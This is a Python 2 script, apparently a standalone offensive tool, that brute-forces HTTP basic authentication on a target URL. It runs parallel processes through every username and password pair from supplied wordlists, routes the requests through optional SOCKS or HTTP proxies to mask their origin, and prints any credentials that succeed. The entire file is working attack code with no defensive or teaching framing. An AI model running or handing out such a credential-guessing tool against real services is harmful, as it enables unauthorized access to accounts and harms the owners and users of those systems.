#!/usr/bin/env python
# -*- coding: utf-8 -*

'''
Small Multiprocessing python script to brute force web basic authentication
with proxy http and socks proxy support.
...
'''

__author__ = "C4rt"
__date__ = "15/07/2013"
__version__ = "1.0"
__maintainer__ = "C4rt"
__email__ = "eric.c4rtman@gmail.com"
__status__ = "Production"

try:
    import requesocks
    import multiprocessing
    import Queue
    import optparse
    import traceback
except ImportError, err:
    raise
    print >>sys.stderr, "[X] Unable to import : %s\n" % err
    sys.exit(1)


def enumattempt(url, credqueue, validqueue, proxy):
  print '[*] Starting new enum thread.'
  while True:
    try:
      creds = credqueue.get(timeout=10)
    except Queue.Empty:
      print '[-] Credential queue is empty, quitting.'
      return
    # If there are good creds in the queue, stop the thread
    if not validqueue.empty():
        print '[-] Success queue has credentials, quitting.'
        return
    try:
        #resp = requests.request('GET', url, auth=(creds[0], creds[1]), proxies=proxy)
        s = requesocks.Session()
        s.auth = (creds[0], creds[1])
        s.proxies = proxy
        resp = s.get(url)
        if resp.status_code == 200:
            print '[+] Success: {0} : {1}'.format(creds[0], creds[1])
            validqueue.put(creds)
            return
        else:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
    except:
        print "\n\n\n\n", traceback.format_exc()

def main():
    parser = optparse.OptionParser(
        "Usage: bruteAuthWeb.py -H <url> -u <user names file> -d <Password names file> -S <Proxy specification as socks5://host:port or http://user@passwordhost:port>")
    parser.add_option('-H', dest='tgtUrl', type='string',
                          help='specify target Url')
    parser.add_option('-u', dest='userfile', type='string',
                          help='specify dictionnary with login usernames')
    parser.add_option('-d', dest='passfile', type='string',
                          help='specify dictionnary with passwords')
    parser.add_option('-S', dest='proxydef', type='string',
                          help='specify proxy sock element as host:port')
    (options, args) = parser.parse_args()

    url = options.tgtUrl
    userfile = options.userfile
    passfile = options.passfile
    prox = options.proxydef

    if url == None or userfile == None or passfile == None:
        print parser.usage
        exit(0)
    #
    credqueue = multiprocessing.Queue()
    validqueue = multiprocessing.Queue()
    procs = []
    usernames = open(userfile).read().splitlines()
    passnames = open(passfile).read().splitlines()
    proxy={}
    if prox:
      proxy.update({'http': prox, 'https': prox})

    print "\nStarting enumeration\n======================"
    for c in range(multiprocessing.cpu_count()):
      p = multiprocessing.Process(target=enumattempt, args=(url, credqueue, validqueue, proxy))
      procs.append(p)
      p.start()

    for user in usernames:
        for pwd in passnames:
          credqueue.put((user, pwd))

    for p in procs:
      p.join()

    while not validqueue.empty():
      print "\n\nThe following credentials pairs were valid:\n"
      user, pwd = validqueue.get()
      print "User : {0} / Pass: {1}".format(user, pwd)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n\n[%] Process interrupted by user..", "r", "error"
    except:
        print "\n\n\n\n", traceback.format_exc()
